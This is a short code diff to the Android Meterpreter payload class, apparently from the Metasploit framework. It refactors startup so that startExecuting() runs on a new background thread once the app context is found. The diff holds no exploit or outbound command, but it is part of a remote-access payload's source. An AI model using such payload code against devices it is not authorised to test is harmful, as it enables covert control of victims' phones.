@@ -49,6 +49,19 @@ public class AndroidMeterpreter extends Meterpreter {
     private static String writeableDir;
     private static Context context;
 
+    private void startExecutingOnThread() {
+        new Thread() {
+            @Override
+            public void run() {
+                try {
+                    startExecuting();
+                } catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }.start();
+    }
+
     private void findContext() throws Exception {
         final Class<?> activityThreadClass = Class.forName("android.app.ActivityThread");
         final Method currentApplication = activityThreadClass.getMethod("currentApplication");
@@ -63,11 +76,7 @@ public class AndroidMeterpreter extends Meterpreter {
                     } catch (Exception e) {
                         e.printStackTrace();
                     }
-                    try {
-                        startExecuting();
-                    } catch (Exception e) {
-                        e.printStackTrace();
-                    }
+                    startExecutingOnThread();
                 }
             });
         } else {
